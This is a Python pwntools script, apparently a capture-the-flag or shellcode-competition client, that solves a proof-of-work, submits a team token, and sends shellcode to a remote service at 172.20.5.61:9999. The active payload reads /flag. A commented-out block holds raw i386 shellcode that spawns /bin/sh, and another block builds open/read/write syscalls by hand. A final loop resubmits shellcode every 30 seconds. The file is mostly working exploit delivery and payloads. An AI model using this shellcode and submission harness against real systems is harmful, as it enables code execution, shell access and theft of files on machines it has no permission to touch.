#!/usr/bin/python3
import struct
import hashlib
import pwn
import os
import time
from Crypto.Util.number import *


team_token = '0676467f246f3fc0e2219c6c99dcdb0e'

def proof_of_work_solve(chal):
    sol = os.urandom(4)
    while not hashlib.sha256(chal + sol).hexdigest().startswith('00000'):
        sol = os.urandom(4)
    return sol.hex()

def do_start() -> pwn.remote:
    r = pwn.remote('172.20.5.61', 9999)
    r.recvuntil(b"'''\nchal: ")
    PoW = r.recv(16)
    print('PoW found:', PoW.decode())
    r.send(proof_of_work_solve(PoW).encode())
    r.recvuntil(b"'\\n')>")
    r.send(f'{team_token}\n'.encode())
    return r


def interactive():
    r = do_start()
    r.interactive()

def send_shellcode(shellcode):
    r = do_start()
    r.recvuntil(b"'\\n')>")
    r.send(f'{shellcode.hex()}\n'.encode())
    r.recvuntil(b'ranking board:\n')
    print(r.recvall().decode())
    r.close()

if __name__ == '__main__':
    # shellcode = b"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"
    # send_shellcode(shellcode)
    # shellcode = bytes.fromhex('7300')
    # shellcode = ""
    # shellcode += pwn.shellcraft.i386.pushstr('/flag').rstrip()
    # shellcode += pwn.shellcraft.i386.linux.syscall('SYS_open',"esp", 0).rstrip()
    # shellcode += pwn.shellcraft.i386.linux.syscall('SYS_read',"eax", 0x80f2000,40).rstrip()
    # shellcode += pwn.shellcraft.i386.linux.syscall('SYS_write',1, 0x80f2000,40).rstrip()
    # shellcode += pwn.shellcraft.i386.linux.syscall('SYS_exit', 0)
    # shellcode = pwn.asm(shellcode)
    shellcode = pwn.asm(pwn.shellcraft.cat('/flag'))

    send_shellcode(shellcode)
    shellcode = b''
    while True:
        send_shellcode(shellcode)
        t = int(time.time())
        print(f'[{(t // 3600 + 8) % 24}:{t // 60 % 60}:{t % 60}] sent')
        time.sleep(30)